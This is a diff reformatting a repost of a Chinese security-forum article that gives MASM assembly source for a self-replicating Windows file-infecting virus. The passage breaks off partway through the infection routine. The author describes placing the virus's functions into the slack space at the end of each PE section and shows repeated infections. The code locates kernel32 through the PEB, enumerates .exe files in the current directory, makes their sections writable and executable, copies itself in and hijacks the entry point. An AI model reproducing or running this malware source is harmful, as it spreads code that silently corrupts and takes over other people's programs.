@@ -1,770 +1,782 @@
 
-
 # 将病毒代码添加到每节末尾进行感染
 
 > 原文：[`www.pediy.com/kssd/pediy12/136566.html`](https://www.pediy.com/kssd/pediy12/136566.html)
 
-好早就想实现这个东西了，论坛里似乎没有这个。  
-  
-想了想，也没有其它的什么好办法，只好将单独的函数一个一个分别添加到节末尾，然后在函数的末尾加上一个它所需调用函数的绝对地址表。不知道大家有什么其它更好的方法，请指教。  
-  
-写的时候很匆忙，有可以优化的地方，比方说要把最大的节空隙分配给最长的函数。代码也可以精简一点。病毒是会重复感染的，正好检查感染的效果。  
-  
-病毒长 1902 字节。  
-  
-以下感染的结果：  
-  
-未感染时：  
-![](img/6f07e1d0d5503b2bfaf9e3be95900cee.jpg)  
-感染一次：  
-![](img/0184bf07b84d30d22d823913e65d3e19.jpg)  
-  
-感染两次：  
-![](img/39a9991f2955590d405230c4c202c571.jpg)  
-  
-感染三次：  
-![](img/1c3aa0d29df2d0009219758bcd099147.jpg)  
-  
-感染四次：  
-![](img/29079e11e9ae781810807114cce1c747.jpg)  
-感染五次：  
-![](img/715fc6e9c93bc083d8dd93ff336b6964.jpg)  
-以下代码：  
+好早就想实现这个东西了，论坛里似乎没有这个。
 
-代码:
+想了想，也没有其它的什么好办法，只好将单独的函数一个一个分别添加到节末尾，然后在函数的末尾加上一个它所需调用函数的绝对地址表。不知道大家有什么其它更好的方法，请指教。
+
+写的时候很匆忙，有可以优化的地方，比方说要把最大的节空隙分配给最长的函数。代码也可以精简一点。病毒是会重复感染的，正好检查感染的效果。
+
+病毒长 1902 字节。
+
+以下感染的结果：
+
+未感染时：
+
+![](img/6f07e1d0d5503b2bfaf9e3be95900cee.jpg)
+
+感染一次：
+
+![](img/0184bf07b84d30d22d823913e65d3e19.jpg)
+
+感染两次：
+
+![](img/39a9991f2955590d405230c4c202c571.jpg)
+
+感染三次：
+
+![](img/1c3aa0d29df2d0009219758bcd099147.jpg)
+
+感染四次：
+
+![](img/29079e11e9ae781810807114cce1c747.jpg)
+
+感染五次：
+
+![](img/715fc6e9c93bc083d8dd93ff336b6964.jpg)
+
+以下代码：
 
 ```
-    .386
-    .model flat,stdcall
-    option casemap:none
-    
-include    windows.inc
-include    kernel32.inc
-includelib  kernel32.lib
-    
-    .code
+代码:
+```
+
+
+
+```asm
+    .386
+    .model flat,stdcall
+    option casemap:none
+    
+include    windows.inc
+include    kernel32.inc
+includelib  kernel32.lib
+    
+    .code
 start:
-    pushad
-    call  @f
+    pushad
+    call  @f
 @@:
-    pop  ebp
-    sub  ebp, offset @b
+    pop  ebp
+    sub  ebp, offset @b
 
-    assume  fs:nothing    
-    mov  eax, fs:\[30h\]
-    mov   eax, \[eax + 0ch\]
-    mov  eax, \[eax + 1ch\]
-    mov  eax, \[eax\]
-    mov  eax, \[eax + 8h\]
-    
-    push  eax
-    mov  eax, offset pGetAllProcAddr\_0
-    add  eax, ebp
-    call  dword ptr \[eax\]
-    mov  eax, offset pInfect\_0
-    add  eax, ebp  
-    call  dword ptr \[eax\]
-\_jmp      db  0e9h
-\_offset      dd  0
-    push  0
-    mov  eax, offset pProcAddr\_0
-    add  eax, ebp
-    mov  eax, \[eax\]
-    add  eax, offset pExitProcess - offset \_ProcAddr
-    call  dword ptr \[eax\]
+    assume  fs:nothing     
+    mov  eax, fs:\[30h\]
+    mov   eax, \[eax + 0ch\]
+    mov  eax, \[eax + 1ch\]
+    mov  eax, \[eax\]
+    mov  eax, \[eax + 8h\]
+    
+    push  eax
+    mov  eax, offset pGetAllProcAddr_0
+    add  eax, ebp
+    call  dword ptr \[eax\]
+    mov  eax, offset pInfect_0
+    add  eax, ebp   
+    call  dword ptr \[eax\]
+_jmp      db  0e9h
+_offset      dd  0
+    push  0
+    mov  eax, offset pProcAddr_0
+    add  eax, ebp
+    mov  eax, \[eax\]
+    add  eax, offset pExitProcess - offset _ProcAddr
+    call  dword ptr \[eax\]
 
-\_start\_end:    
-pGetAllProcAddr\_0  dd  offset \_GetAllProcAddr
-pInfect\_0    dd  offset \_Infect
-pProcAddr\_0    dd  offset \_ProcAddr
-  
-\_ProcName:    
-szCreateFile    db  'CreateFileA',0
-szCreateFileMapping  db  'CreateFileMappingA',0
-szMapViewOfFile    db  'MapViewOfFile',0
-szUnmapViewOfFile  db  'UnmapViewOfFile',0
-szCloseHandle    db  'CloseHandle',0
-szGetCurrentDirectory  db  'GetCurrentDirectoryA',0
-szFindFirstFile    db  'FindFirstFileA',0
-szFindNextFile    db  'FindNextFileA',0
-szFindClose    db  'FindClose',0
-szExitProcess    db  'ExitProcess',0
+_start_end:     
+pGetAllProcAddr_0  dd  offset _GetAllProcAddr
+pInfect_0    dd  offset _Infect
+pProcAddr_0    dd  offset _ProcAddr
+   
+_ProcName:     
+szCreateFile    db  'CreateFileA',0
+szCreateFileMapping  db  'CreateFileMappingA',0
+szMapViewOfFile    db  'MapViewOfFile',0
+szUnmapViewOfFile  db  'UnmapViewOfFile',0
+szCloseHandle    db  'CloseHandle',0
+szGetCurrentDirectory  db  'GetCurrentDirectoryA',0
+szFindFirstFile    db  'FindFirstFileA',0
+szFindNextFile    db  'FindNextFileA',0
+szFindClose    db  'FindClose',0
+szExitProcess    db  'ExitProcess',0
 
-\_ProcAddr:
-pCreateFile    dd  0
-pCreateFileMapping  dd  0  
-pMapViewOfFile    dd  0
-pUnmapViewOfFile  dd  0
-pCloseHandle    dd  0
-pGetCurrentDirectory  dd  0
-pFindFirstFile    dd  0
-pFindNextFile    dd  0
-pFindClose    dd  0
-pExitProcess    dd  0
+_ProcAddr:
+pCreateFile    dd  0
+pCreateFileMapping  dd  0   
+pMapViewOfFile    dd  0
+pUnmapViewOfFile  dd  0
+pCloseHandle    dd  0
+pGetCurrentDirectory  dd  0
+pFindFirstFile    dd  0
+pFindNextFile    dd  0
+pFindClose    dd  0
+pExitProcess    dd  0
 
-\_strlen    proc        ;str
-    push  ebp
-    push  edi
-    push  ecx
-    mov  edi, \[esp + 16\]
-    xor  ecx, ecx
-    dec  ecx
-    xor  eax, eax
-    repnz  scasb
-    not  ecx
-    dec  ecx
-    xchg  ecx, eax
-    pop  ecx
-    pop  edi
-    pop  ebp
-    retn  4
-\_strlen   endp
+_strlen    proc        ;str
+    push  ebp
+    push  edi
+    push  ecx
+    mov  edi, \[esp + 16\]
+    xor  ecx, ecx
+    dec  ecx
+    xor  eax, eax
+    repnz  scasb
+    not  ecx
+    dec  ecx
+    xchg  ecx, eax
+    pop  ecx
+    pop  edi
+    pop  ebp
+    retn  4
+_strlen   endp
 
-\_strcmp    proc      ;str1,str2
-    push  ebp
-    call  @f
+_strcmp    proc      ;str1,str2
+    push  ebp
+    call  @f
 @@:
-    pop  ebp
-    sub  ebp, offset @b        
-    push  esi
-    push  edi
-    push  edx
-    push  ecx
-    push  ebx
-    mov  esi, \[esp + 28\]
-    mov  edi, \[esp + 32\]
-    mov  edx, offset pstrlen\_0
-    add  edx, ebp
-    push  esi
-    call  dword ptr \[edx\]
-    mov  ecx, eax
-    push  edi
-    call  dword ptr \[edx\]
-    cmp  eax, ecx
-    xor  eax, eax
-    jne  \_strcmp\_ne
-\_strcmp\_cmp:
-    dec  ecx
-    jl  \_strcmp\_e
-    mov  bl, byte ptr \[esi + ecx \]
-    cmp  bl, byte ptr \[edi + ecx \]
-    jne  \_strcmp\_ne
-    jmp  \_strcmp\_cmp
-\_strcmp\_e:
-    inc  eax
-\_strcmp\_ne:
-    pop  ebx
-    pop  ecx
-    pop  edx
-    pop  edi
-    pop  esi
-    pop  ebp
-    retn  8
-\_strcmp   endp
-\_strcmp\_end:
-pstrlen\_0  dd  offset \_strlen
+    pop  ebp
+    sub  ebp, offset @b         
+    push  esi
+    push  edi
+    push  edx
+    push  ecx
+    push  ebx
+    mov  esi, \[esp + 28\]
+    mov  edi, \[esp + 32\]
+    mov  edx, offset pstrlen_0
+    add  edx, ebp
+    push  esi
+    call  dword ptr \[edx\]
+    mov  ecx, eax
+    push  edi
+    call  dword ptr \[edx\]
+    cmp  eax, ecx
+    xor  eax, eax
+    jne  _strcmp_ne
+_strcmp_cmp:
+    dec  ecx
+    jl  _strcmp_e
+    mov  bl, byte ptr \[esi + ecx \]
+    cmp  bl, byte ptr \[edi + ecx \]
+    jne  _strcmp_ne
+    jmp  _strcmp_cmp
+_strcmp_e:
+    inc  eax
+_strcmp_ne:
+    pop  ebx
+    pop  ecx
+    pop  edx
+    pop  edi
+    pop  esi
+    pop  ebp
+    retn  8
+_strcmp   endp
+_strcmp_end:
+pstrlen_0  dd  offset _strlen
 
-\_GetProcAddr  proc        ;Base,Name
-    push  ebp
-    call  @f
+_GetProcAddr  proc        ;Base,Name
+    push  ebp
+    call  @f
 @@:
-    pop  ebp
-    sub  ebp, offset @b
-    push  ebx
-    push  ecx
-    push  edx
-    push  esi
-    push  edi
-    mov  eax, \[esp + 28\]
-    mov  edi, \[esp + 32\]
-    mov  ebx, eax
-    assume  eax:ptr IMAGE\_DOS\_HEADER
-    mov  eax, \[eax\].e\_lfanew
-    add  eax, ebx
-    assume  eax:nothing
-    assume  eax:ptr IMAGE\_NT\_HEADERS
-    lea  eax, \[eax\].OptionalHeader.DataDirectory\[0\]
-    assume  eax:nothing
-    assume  eax:ptr IMAGE\_DATA\_DIRECTORY
-    mov  eax, \[eax\].VirtualAddress
-    add  eax, ebx
-    assume  eax:nothing
-    assume  eax:ptr IMAGE\_EXPORT\_DIRECTORY
-    mov  ecx, \[eax\].NumberOfNames
-    mov  esi, \[eax\].AddressOfNames
-    assume  eax:nothing
-    push  eax
-    add  esi, ebx
-    sub  esi, 4
-    cdq
+    pop  ebp
+    sub  ebp, offset @b
+    push  ebx
+    push  ecx
+    push  edx
+    push  esi
+    push  edi
+    mov  eax, \[esp + 28\]
+    mov  edi, \[esp + 32\]
+    mov  ebx, eax
+    assume  eax:ptr IMAGE_DOS_HEADER
+    mov  eax, \[eax\].e_lfanew
+    add  eax, ebx
+    assume  eax:nothing
+    assume  eax:ptr IMAGE_NT_HEADERS
+    lea  eax, \[eax\].OptionalHeader.DataDirectory\[0\]
+    assume  eax:nothing
+    assume  eax:ptr IMAGE_DATA_DIRECTORY
+    mov  eax, \[eax\].VirtualAddress
+    add  eax, ebx
+    assume  eax:nothing
+    assume  eax:ptr IMAGE_EXPORT_DIRECTORY
+    mov  ecx, \[eax\].NumberOfNames
+    mov  esi, \[eax\].AddressOfNames
+    assume  eax:nothing
+    push  eax
+    add  esi, ebx
+    sub  esi, 4
+    cdq
 @@:
-    add  esi, 4
-    dec  ecx
-    jl  \_GetProcAddr\_fail
-    push  esi
-    mov  esi, \[esi\]
-    add  esi, ebx
-    mov  eax, offset pstrcmp\_0
-    add  eax, ebp
-    push  esi
-    push  edi
-    call  dword ptr \[eax\]
-    test  eax, eax
-    pop  esi
-    jnz  @f
-    inc  edx
-    jmp  @b
+    add  esi, 4
+    dec  ecx
+    jl  _GetProcAddr_fail
+    push  esi
+    mov  esi, \[esi\]
+    add  esi, ebx
+    mov  eax, offset pstrcmp_0
+    add  eax, ebp
+    push  esi
+    push  edi
+    call  dword ptr \[eax\]
+    test  eax, eax
+    pop  esi
+    jnz  @f
+    inc  edx
+    jmp  @b
 @@:
-    pop  eax
-    assume  eax:ptr IMAGE\_EXPORT\_DIRECTORY  
-    mov  ecx, \[eax\].AddressOfNameOrdinals
-    add  ecx, ebx
-    shl  edx, 1
-    add  ecx, edx
-    movzx  ecx, word ptr \[ecx\]
-    add  ecx, \[eax\].nBase
-    dec  ecx
-    mov  edx, \[eax\].AddressOfFunctions
-    assume  eax:nothing  
-    add  edx, ebx
-    shl  ecx, 2
-    add  edx, ecx
-    mov  eax, \[edx\]
-    add  eax, ebx
+    pop  eax
+    assume  eax:ptr IMAGE_EXPORT_DIRECTORY   
+    mov  ecx, \[eax\].AddressOfNameOrdinals
+    add  ecx, ebx
+    shl  edx, 1
+    add  ecx, edx
+    movzx  ecx, word ptr \[ecx\]
+    add  ecx, \[eax\].nBase
+    dec  ecx
+    mov  edx, \[eax\].AddressOfFunctions
+    assume  eax:nothing   
+    add  edx, ebx
+    shl  ecx, 2
+    add  edx, ecx
+    mov  eax, \[edx\]
+    add  eax, ebx
 @@:
-    pop  edi
-    pop  esi
-    pop  edx
-    pop  ecx
-    pop  ebx
-    pop  ebp
-    retn  8
-\_GetProcAddr\_fail:
-    pop  edi
-    jmp  @b
-\_GetProcAddr   endp
+    pop  edi
+    pop  esi
+    pop  edx
+    pop  ecx
+    pop  ebx
+    pop  ebp
+    retn  8
+_GetProcAddr_fail:
+    pop  edi
+    jmp  @b
+_GetProcAddr   endp
 
-\_GetProcAddr\_end:
-pstrcmp\_0  dd  offset \_strcmp
+_GetProcAddr_end:
+pstrcmp_0  dd  offset _strcmp
 
-\_GetAllProcAddr  proc        ;base
-    pushad
-    call  @f
+_GetAllProcAddr  proc        ;base
+    pushad
+    call  @f
 @@:
-    pop  ebp
-    sub  ebp, offset @b
-    mov  edx, \[esp + 36\]
-    mov  esi, offset pProcName\_0
-    add  esi, ebp
-    mov  esi, \[esi\]
-    mov  edi, offset pProcAddr\_1
-    add  edi, ebp
-    mov  edi, \[edi\]
-    mov  ecx, 10
+    pop  ebp
+    sub  ebp, offset @b
+    mov  edx, \[esp + 36\]
+    mov  esi, offset pProcName_0
+    add  esi, ebp
+    mov  esi, \[esi\]
+    mov  edi, offset pProcAddr_1
+    add  edi, ebp
+    mov  edi, \[edi\]
+    mov  ecx, 10
 @@:
-    mov  ebx, offset pGetProcAddr\_0
-    add  ebx, ebp
-    push  esi
-    push  edx
-    call  dword ptr \[ebx\]
-    stosd
-    mov  ebx, offset pstrlen\_1
-    add  ebx, ebp
-    push  esi
-    call   dword ptr \[ebx\]
-    inc  eax
-    add  esi, eax
-    dec  ecx
-    jnz  @b
-    popad
-    retn  4      
-\_GetAllProcAddr endp
+    mov  ebx, offset pGetProcAddr_0
+    add  ebx, ebp
+    push  esi
+    push  edx
+    call  dword ptr \[ebx\]
+    stosd
+    mov  ebx, offset pstrlen_1
+    add  ebx, ebp
+    push  esi
+    call   dword ptr \[ebx\]
+    inc  eax
+    add  esi, eax
+    dec  ecx
+    jnz  @b
+    popad
+    retn  4       
+_GetAllProcAddr endp
 
-\_GetAllProcAddr\_end:
-pGetProcAddr\_0  dd  offset \_GetProcAddr
-pstrlen\_1  dd  offset \_strlen
-pProcName\_0  dd  offset \_ProcName
-pProcAddr\_1  dd  offset \_ProcAddr
+_GetAllProcAddr_end:
+pGetProcAddr_0  dd  offset _GetProcAddr
+pstrlen_1  dd  offset _strlen
+pProcName_0  dd  offset _ProcName
+pProcAddr_1  dd  offset _ProcAddr
 
-\_Infect    proc
-    pushad
-    call  @f
+_Infect    proc
+    pushad
+    call  @f
 @@:
-    pop  ebp
-    sub  ebp, offset @b
-    sub  esp, 2 \* sizeof(WIN32\_FIND\_DATA)
-    sub  esp, MAX\_PATH
-    mov  eax, offset pProcAddr\_2
-    add  eax, ebp
-    mov  eax, \[eax\]
-    add  eax, offset pGetCurrentDirectory - offset \_ProcAddr
-    push  esp
-    push  MAX\_PATH
-    call   dword ptr \[eax\]
-    add  eax, esp
-    mov  byte ptr \[eax\], '\\'
-    mov  byte ptr \[eax + 1\], '\*'
-    mov  byte ptr \[eax + 2\], '.'
-    mov  byte ptr\[eax + 3\], 'e'
-    mov  byte ptr \[eax + 4\], 'x'
-    mov  byte ptr \[eax + 5\], 'e'
-    mov  byte ptr \[eax + 6\], 0
-    mov  eax, offset pProcAddr\_2
-    add  eax, ebp
-    mov  eax, \[eax\]
-    add  eax, offset pFindFirstFile - offset \_ProcAddr
-    mov  ebx, esp
-    add  ebx, MAX\_PATH
-    assume  ebx:ptr WIN32\_FIND\_DATA
-    push  ebx
-    lea  ecx, \[esp + 4\]
-    push  ecx
-    call  dword ptr \[eax\]
-    xchg  eax, edx
-    mov  ecx, offset pProcAddr\_2
-    add  ecx, ebp
-    mov  ecx, \[ecx\]
-    add  ecx, offset pFindNextFile - offset \_ProcAddr
-\_Infect\_search:
-    mov  eax, offset pAddCode\_0
-    add  eax, ebp
-    lea  esi, dword ptr \[ebx\].cFileName
-    push  esi
-    call   dword ptr \[eax\]
-    push  ecx
-    push  edx
-    push  ebx
-    push  edx
-    call  dword ptr \[ecx\]
-    pop  edx
-    pop  ecx
-    test  eax, eax
-    jnz  \_Infect\_search  
-    assume  ebx:nothing
-    add  esp, MAX\_PATH
-    add  esp, 2 \* sizeof(WIN32\_FIND\_DATA)
-    popad
-    retn  
-\_Infect   endp
+    pop  ebp
+    sub  ebp, offset @b
+    sub  esp, 2 * sizeof(WIN32_FIND_DATA)
+    sub  esp, MAX_PATH
+    mov  eax, offset pProcAddr_2
+    add  eax, ebp
+    mov  eax, \[eax\]
+    add  eax, offset pGetCurrentDirectory - offset _ProcAddr
+    push  esp
+    push  MAX_PATH
+    call   dword ptr \[eax\]
+    add  eax, esp
+    mov  byte ptr \[eax\], '\\'
+    mov  byte ptr \[eax + 1\], '\*'
+    mov  byte ptr \[eax + 2\], '.'
+    mov  byte ptr\[eax + 3\], 'e'
+    mov  byte ptr \[eax + 4\], 'x'
+    mov  byte ptr \[eax + 5\], 'e'
+    mov  byte ptr \[eax + 6\], 0
+    mov  eax, offset pProcAddr_2
+    add  eax, ebp
+    mov  eax, \[eax\]
+    add  eax, offset pFindFirstFile - offset _ProcAddr
+    mov  ebx, esp
+    add  ebx, MAX_PATH
+    assume  ebx:ptr WIN32_FIND_DATA
+    push  ebx
+    lea  ecx, \[esp + 4\]
+    push  ecx
+    call  dword ptr \[eax\]
+    xchg  eax, edx
+    mov  ecx, offset pProcAddr_2
+    add  ecx, ebp
+    mov  ecx, \[ecx\]
+    add  ecx, offset pFindNextFile - offset _ProcAddr
+_Infect_search:
+    mov  eax, offset pAddCode_0
+    add  eax, ebp
+    lea  esi, dword ptr \[ebx\].cFileName
+    push  esi
+    call   dword ptr \[eax\]
+    push  ecx
+    push  edx
+    push  ebx
+    push  edx
+    call  dword ptr \[ecx\]
+    pop  edx
+    pop  ecx
+    test  eax, eax
+    jnz  _Infect_search   
+    assume  ebx:nothing
+    add  esp, MAX_PATH
+    add  esp, 2 * sizeof(WIN32_FIND_DATA)
+    popad
+    retn   
+_Infect   endp
 
-\_Infect\_end:
-pAddCode\_0  dd  offset \_AddCode
-pProcAddr\_2  dd  offset \_ProcAddr
+_Infect_end:
+pAddCode_0  dd  offset _AddCode
+pProcAddr_2  dd  offset _ProcAddr
 
-\_AddCode  proc        ;szFileName
-    pushad
-    call  @f
+_AddCode  proc        ;szFileName
+    pushad
+    call  @f
 @@:
-    pop  ebp
-    sub  ebp, offset @b
-    sub  esp, 52
-    mov  esi, \[esp + 88\]
-    mov  eax, offset ProcAddr\_3
-    add  eax, ebp
-    mov  eax, \[eax\]
-    add  eax, offset pCreateFile - offset \_ProcAddr
-    push  0
-    push  FILE\_ATTRIBUTE\_NORMAL
-    push  OPEN\_EXISTING
-    push  0
-    push  FILE\_SHARE\_READ
-    push  GENERIC\_READ + GENERIC\_WRITE
-    push  esi
-    call  dword ptr \[eax\]
-    cmp  eax, INVALID\_HANDLE\_VALUE
-    jz  \_AddCode\_end0
-    mov  \[esp\], eax
-    mov  ebx, offset ProcAddr\_3
-    add  ebx, ebp
-    mov  ebx, \[ebx\]
-    add  ebx, offset pCreateFileMapping - offset \_ProcAddr
-    push  0
-    push  0
-    push  0
-    push  PAGE\_READWRITE
-    push  0
-    push  eax
-    call  dword ptr \[ebx\]
-    test  eax, eax
-    jz  \_AddCode\_end1
-    mov  \[esp + 4\], eax
-    mov  ebx, offset ProcAddr\_3
-    add  ebx, ebp
-    mov  ebx, \[ebx\]
-    add  ebx, offset pMapViewOfFile - offset \_ProcAddr
-    push  0
-    push  0
-    push  0
-    push  FILE\_MAP\_WRITE
-    push  eax
-    call  dword ptr \[ebx\]
-    test  eax, eax
-    jz  \_AddCode\_end2
-    mov  ebx, eax
-    assume  eax:ptr IMAGE\_DOS\_HEADER
-    cmp  \[eax\].e\_magic, 5A4Dh
-    jnz  \_AddCode\_end3
-    mov  eax, \[eax\].e\_lfanew
-    add  eax, ebx
-    assume  eax:nothing
-    assume  eax:ptr IMAGE\_NT\_HEADERS
-    cmp  \[eax\].Signature, 4550h
-    jnz  \_AddCode\_end3
-    mov  ecx, \[eax\].OptionalHeader.ImageBase
-    mov  \[esp + 8\], ecx
-    lea  ecx, \[eax\].OptionalHeader.AddressOfEntryPoint
-    mov  \[esp + 48\], ecx
-    movzx  ecx, \[eax\].FileHeader.NumberOfSections
-    assume  eax:nothing
-    add  eax, sizeof(IMAGE\_NT\_HEADERS)
-    assume  eax:ptr IMAGE\_SECTION\_HEADER
+    pop  ebp
+    sub  ebp, offset @b
+    sub  esp, 52
+    mov  esi, \[esp + 88\]
+    mov  eax, offset ProcAddr_3
+    add  eax, ebp
+    mov  eax, \[eax\]
+    add  eax, offset pCreateFile - offset _ProcAddr
+    push  0
+    push  FILE_ATTRIBUTE_NORMAL
+    push  OPEN_EXISTING
+    push  0
+    push  FILE_SHARE_READ
+    push  GENERIC_READ + GENERIC_WRITE
+    push  esi
+    call  dword ptr \[eax\]
+    cmp  eax, INVALID_HANDLE_VALUE
+    jz  _AddCode_end0
+    mov  \[esp\], eax
+    mov  ebx, offset ProcAddr_3
+    add  ebx, ebp
+    mov  ebx, \[ebx\]
+    add  ebx, offset pCreateFileMapping - offset _ProcAddr
+    push  0
+    push  0
+    push  0
+    push  PAGE_READWRITE
+    push  0
+    push  eax
+    call  dword ptr \[ebx\]
+    test  eax, eax
+    jz  _AddCode_end1
+    mov  \[esp + 4\], eax
+    mov  ebx, offset ProcAddr_3
+    add  ebx, ebp
+    mov  ebx, \[ebx\]
+    add  ebx, offset pMapViewOfFile - offset _ProcAddr
+    push  0
+    push  0
+    push  0
+    push  FILE_MAP_WRITE
+    push  eax
+    call  dword ptr \[ebx\]
+    test  eax, eax
+    jz  _AddCode_end2
+    mov  ebx, eax
+    assume  eax:ptr IMAGE_DOS_HEADER
+    cmp  \[eax\].e_magic, 5A4Dh
+    jnz  _AddCode_end3
+    mov  eax, \[eax\].e_lfanew
+    add  eax, ebx
+    assume  eax:nothing
+    assume  eax:ptr IMAGE_NT_HEADERS
+    cmp  \[eax\].Signature, 4550h
+    jnz  _AddCode_end3
+    mov  ecx, \[eax\].OptionalHeader.ImageBase
+    mov  \[esp + 8\], ecx
+    lea  ecx, \[eax\].OptionalHeader.AddressOfEntryPoint
+    mov  \[esp + 48\], ecx
+    movzx  ecx, \[eax\].FileHeader.NumberOfSections
+    assume  eax:nothing
+    add  eax, sizeof(IMAGE_NT_HEADERS)
+    assume  eax:ptr IMAGE_SECTION_HEADER
+    
+    mov  \[eax\].Characteristics, 0E00000E0h     
+    mov  edx, \[eax\].SizeOfRawData
+    sub  edx, \[eax\].Misc.VirtualSize
+    mov  edi, \[eax\].PointerToRawData
+    add  edi, \[eax\].Misc.VirtualSize
+    add  edi, ebx
+_1:     
+    sub  edx, offset _ProcAddr - offset _ProcName
+    mov  esi, 1
+    jl  _jmptable
+    add  \[eax\].Misc.VirtualSize, offset _ProcAddr - offset _ProcName
+    mov  esi, edi
+    sub  esi, \[eax\].PointerToRawData
+    add  esi, \[eax\].VirtualAddress
+    add  esi, \[esp + 8\]
+    sub  esi, ebx
+    mov  \[esp + 12\], esi        ;\[esp + 12\] = ProcAddr
+    mov  esi, offset ProcAddr_3
+    add  esi, ebp
+    mov  esi, \[esi\]
+    push  ecx
+    mov  ecx, 10
+@@:
+    movsd
+    dec  ecx
+    jnz  @b
+    pop  ecx
+_2:       
+    sub  edx, offset _strlen - offset _ProcName
+    mov  esi, 2
+    jl  _jmptable
+    add  \[eax\].Misc.VirtualSize, offset _strlen - offset _ProcName
+    mov  esi, edi
+    sub  esi, \[eax\].PointerToRawData
+    add  esi, \[eax\].VirtualAddress
+    add  esi, \[esp + 8\]
+    sub  esi, ebx
+    mov  \[esp+16\], esi        ;\[esp + 16\] = ProcName
+    mov  esi, offset ProcName_1
+    add  esi, ebp
+    mov  esi, \[esi\]
+    push  ecx
+    mov  ecx, offset _strlen - offset _ProcName
+@@:
+    movsb
+    dec   ecx
+    jnz  @b
+    pop  ecx
+_3:     
+    sub  edx, offset _strcmp - offset _strlen
+    mov  esi, 3
+    jl  _jmptable
+    add  \[eax\].Misc.VirtualSize, offset _strcmp - offset _strlen
+    mov  esi, edi
+    sub  esi, \[eax\].PointerToRawData
+    add  esi, \[eax\].VirtualAddress
+    add  esi, \[esp + 8\]
+    sub  esi, ebx
+    mov  \[esp + 20\], esi        ;\[esp + 20\] = _strlen
+    mov  esi, offset pstrlen_2
+    add  esi, ebp
+    mov  esi, \[esi\]
+    push  ecx
+    mov  ecx, offset _strcmp - offset _strlen
+@@:
+    movsb
+    dec  ecx
+    jnz  @b
+    pop  ecx
+_4:     
+    sub  edx, offset _strcmp_end - offset _strcmp + 4
+    mov  esi, 4
+    jl  _jmptable
+    add  \[eax\].Misc.VirtualSize, offset _strcmp_end - offset _strcmp + 4
+    mov  esi, edi
+    sub  esi, \[eax\].PointerToRawData
+    add  esi, \[eax\].VirtualAddress
+    add  esi, \[esp + 8\]
+    sub  esi, ebx
+    mov  \[esp + 24\], esi        ;\[esp + 24\] = _strcmp
+    mov  esi, offset pstrcmp_1
+    add  esi, ebp
+    mov  esi, \[esi\]
+    push  ecx
+    mov  ecx, offset _strcmp_end - offset _strcmp
+@@:
+    movsb
+    dec  ecx
+    jnz  @b
+    pop  ecx
+    lea  esi, \[esp + 20\]
+    movsd
+_5:     
+    sub  edx, offset _GetProcAddr_end - offset _GetProcAddr + 4
+    mov  esi, 5
+    jl  _jmptable
+    add  \[eax\].Misc.VirtualSize, offset _GetProcAddr_end - offset _GetProcAddr + 4
+    mov  esi, edi
+    sub  esi, \[eax\].PointerToRawData
+    add  esi, \[eax\].VirtualAddress
+    add  esi, \[esp + 8\]
+    sub  esi, ebx
+    mov  \[esp + 28\], esi        ;\[esp + 28\] = _GetProcAddr
+    mov  esi, offset pGetProcAddr_1
+    add  esi, ebp
+    mov  esi, \[esi\]
+    push  ecx
+    mov  ecx, offset _GetProcAddr_end - offset _GetProcAddr
+@@:
+    movsb
+    dec  ecx
+    jnz  @b
+    pop  ecx
+    lea  esi, \[esp + 24\]
+    movsd
+_6:     
+    sub  edx, offset _GetAllProcAddr_end - offset _GetAllProcAddr + 16
+    mov  esi, 6
+    jl  _jmptable
+    add  \[eax\].Misc.VirtualSize, offset _GetAllProcAddr_end - offset _GetAllProcAddr + 16
+    mov  esi, edi
+    sub  esi, \[eax\].PointerToRawData
+    add  esi,\[eax\].VirtualAddress
+    add  esi, \[esp + 8\]
+    sub  esi, ebx
+    mov  \[esp + 32\], esi        ;\[esp + 32\] = _GetAllProcAddr
+    mov  esi, offset pGetAllProcAddr_1
+    add  esi, ebp
+    mov  esi, \[esi\]
+    push  ecx
+    mov  ecx, offset _GetAllProcAddr_end - offset _GetAllProcAddr
+@@:
+    movsb
+    dec  ecx
+    jnz  @b
+    pop  ecx
+    lea  esi, \[esp + 28\]
+    movsd
+    lea  esi, \[esp + 20\]
+    movsd
+    lea  esi, \[esp + 16\]
+    movsd
+    lea  esi, \[esp + 12\]
+    movsd
+_7:     
+    sub  edx, offset _AddCode_end - offset _AddCode + 36
+    mov  esi, 7
+    jl  _jmptable
+    add  \[eax\].Misc.VirtualSize, offset _AddCode_end - offset _AddCode + 36
+    mov  esi, edi
+    sub  esi, \[eax\].PointerToRawData
+    add  esi, \[eax\].VirtualAddress
+    add  esi, \[esp + 8\]
+    sub  esi, ebx
+    mov  \[esp + 36\], esi        ;\[esp + 36\] = _AddCode
+    mov  esi, offset pAddCode_1
+    add  esi, ebp
+    mov  esi, \[esi\] 
+    push  ecx
+    mov  ecx, offset _AddCode_end - offset _AddCode
+@@:
+    movsb
+    dec  ecx
+    jnz  @b
+    pop  ecx
+    lea  esi, \[esp +12\]
+    movsd
+    lea  esi, \[esp + 16\]
+    movsd
+    lea  esi, \[esp + 20\]
+    movsd
+    lea  esi, \[esp + 24\]
+    movsd
+    lea  esi, \[esp + 28\]
+    movsd
+    lea  esi, \[esp + 32\]
+    movsd
+    push  edi
+    movsd
+    lea  esi, \[esp + 40\]
+    movsd
+    push  edi
+    movsd
+_8:     
+    sub  edx, offset _AddCode - offset _Infect + 8
+    mov  esi, 8
+    jl  _jmptable
+    add  \[eax\].Misc.VirtualSize, offset _AddCode - offset _Infect + 8
+    mov  esi, edi
+    sub  esi, \[eax\].PointerToRawData
+    add  esi, \[eax\].VirtualAddress
+    add  esi, \[esp + 16\]
+    sub  esi, ebx
+    mov  \[esp + 48\], esi        ;\[esp + 40\] = _Infect
+    mov  esi, offset pInfect_1
+    add  esi, ebp
+    mov  esi, \[esi\]
+    push  ecx
+    mov  ecx, offset _Infect_end - offset _Infect
+@@:
+    movsb
+    dec  ecx
+    jnz  @b
+    pop  ecx
+    lea  esi, \[esp + 44\]
+    movsd
+    lea  esi, \[esp + 20\]
+    movsd
+    pop  esi
+    push  ecx
+    mov  ecx, \[esp + 48\]
+    mov  \[esi\], ecx
+    pop  ecx
+_9:
+    sub  edx, offset _start_end - offset start + 16
+    mov  esi, 9
+    jl  _jmptable
+    add  \[eax\].Misc.VirtualSize, offset _start_end - offset start + 16 
+    push  ecx
+    mov  esi, edi
+    sub  esi, \[eax\].PointerToRawData
+    add  esi, \[eax\].VirtualAddress
+    sub  esi, ebx
+    mov  ecx, \[esp + 56\]
+    push  \[ecx\]
+    mov  \[ecx\], esi
+    add  esi, \[esp + 20\]
+    mov  \[esp + 56\], esi        ;\[esp + 44\] = start
+    mov  ecx, esi
